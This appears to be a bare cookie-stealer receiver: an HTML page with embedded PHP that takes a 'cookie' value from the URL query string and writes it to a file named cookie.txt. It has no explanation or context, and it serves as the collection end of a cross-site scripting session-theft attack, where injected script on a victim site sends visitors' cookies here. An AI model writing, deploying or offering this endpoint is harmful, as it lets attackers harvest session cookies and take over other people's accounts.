<!DOCTYPE html>
<html>
<head>
	<title></title>
</head>
<body>
	<?php
		$cookie = $_GET['cookie'];
		$file = fopen('cookie.txt', 'w');
		fwrite($file, $cookie . '');
	?>
</body>
</html>
